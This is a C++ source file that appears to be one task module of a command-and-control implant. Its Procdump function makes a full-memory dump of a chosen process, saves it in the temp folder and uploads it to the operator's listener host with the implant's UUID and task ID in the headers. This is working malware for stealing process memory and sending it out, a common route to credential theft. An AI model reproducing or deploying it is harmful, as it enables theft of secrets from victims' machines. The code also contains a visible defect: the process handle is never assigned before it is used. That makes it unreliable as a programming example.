#include "core/task.hpp"

namespace Task
{
    std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid)
    {
        HANDLE hProcess;
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
        // std::wstring wDumpFilePath = L"tmp.dmp";
        std::wstring wDumpFilePath = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\tmp.dmp";

        HANDLE hFile = System::Fs::CreateNewFile(
            pState->pProcs,
            wDumpFilePath.c_str()
        );
        if (hFile == INVALID_HANDLE_VALUE)
        {
            return L"Error: Could not create a file to dump.";
        }

        if (!System::Process::ProcessOpen(pState->pProcs, dwPid, PROCESS_ALL_ACCESS))
        {
            pState->pProcs->lpNtClose(hFile);
            return L"Error: Could not open process.";
        }

        if (!MiniDumpWriteDump(
            hProcess,
            dwPid,
            hFile,
            MiniDumpWithFullMemory,
            NULL,
            NULL,
            NULL
        )) {
            pState->pProcs->lpNtClose(hFile);
            pState->pProcs->lpNtClose(hProcess);
            return L"Error: Could not dump the process.";
        }

        pState->pProcs->lpNtClose(hFile);
        pState->pProcs->lpNtClose(hProcess);

        // Upload a dumped file.
        std::wstring wHeaders = L"";
        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
        wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
        wHeaders += L"X-FILE: procdump\r\n";

        if (!System::Http::UploadFile(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathUpload,
            wHeaders.c_str(),
            wDumpFilePath
        )) {
            return L"Error: Could not upload the dump file.";
        }

        return wDumpFilePath.c_str();
    }
}